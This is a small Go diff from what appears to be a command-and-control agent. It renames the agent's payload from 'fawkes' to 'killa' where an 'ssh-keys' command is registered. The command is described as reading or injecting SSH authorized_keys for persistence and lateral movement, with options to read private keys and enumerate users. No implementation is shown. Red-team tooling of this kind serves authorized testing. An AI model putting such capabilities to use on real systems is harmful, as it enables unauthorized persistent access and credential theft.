@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "ssh-keys",
 		Description:         "Read or inject SSH authorized_keys for persistence/lateral movement (T1098.004)",
 		HelpString:          "ssh-keys -action <list|add|remove|read-private|enumerate> [-key <ssh_public_key>] [-user <username>] [-path <file_path>]",
